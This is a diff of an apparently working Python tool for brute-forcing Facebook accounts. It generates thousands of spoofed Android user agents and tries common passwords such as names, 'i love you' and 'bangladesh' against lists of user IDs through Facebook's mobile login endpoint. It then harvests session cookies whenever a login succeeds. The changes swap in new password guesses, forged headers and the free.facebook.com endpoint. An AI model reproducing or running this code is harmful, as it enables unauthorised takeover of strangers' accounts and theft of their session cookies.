@@ -118,12 +118,12 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_15 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15A372 Safari/604.1 [FBAN/EMA;FBLC/en_US;FBAV/239.0.0.10.109;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
 ugen=[]
-for x in range(1000):
+for x in range(5000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['6','7','8','9','10','11','12'])
     c=' en-us; GT-'
@@ -175,7 +175,7 @@ logo = (f"""
 \033[0;92m│ [•] GITHUB : NOT FOUNT               
 \033[0;92m│ [•] STATUS : PERSONAL         
 \033[0;92m│ [•] TOOLS  : RANDOM
-\033[0;92m└──────────────────────────────────────┘0.1
+\033[0;92m└──────────────────────────────────────┘
 \x1b[1;94m════════════════════════════════════════\x1b[1;92""")
 def linex():
 	print('\x1b[1;94m═══════════════════════════════════════\x1b[1;92')
@@ -227,7 +227,7 @@ def RJ_SN():
         print('\033[1;92mIF ID NOT COME TURN ON AIRPLNE')
         linex()
         for love in user:
-            pwx = [love[2:],love,code+love,code+love[:3],'sadiya','sumaiya','sabbir','nusrat','ariyan','free fire']
+            pwx = [love[2:],love,code+love,code+love[:3],'jannat','sumaiya','sadiya','mehedi','sabbir','i love you','bangladesh','bangla']
             uid = code+love
             manshera.submit(rcrack,uid,pwx,tl)
     print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90mCRACK PROCESS HAS BEEN COMPLETED ')
@@ -255,25 +255,27 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfdUXdW6vWdS6XcD412YZJ35EA--pILbh697_kvGt8T0bdM1xe63MUQIN8nvepqMr84k2wpRwl9zXwGKq0sb8cX8ciPVAcIYRR7uno5xdcNA4A&smuh=43075&lh=Ac-U8lcJfIFDiv5TmRA&wtsid=rdr_1dGShBfI93vLOXS2J&_rdr',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            header_freefb = {"authority": 'free.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://web.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?0',
+            "sec-ch-ua-platform": "Android",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?1',
+            "pragma": 'no-cache',
+            "priority": 'u=1',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
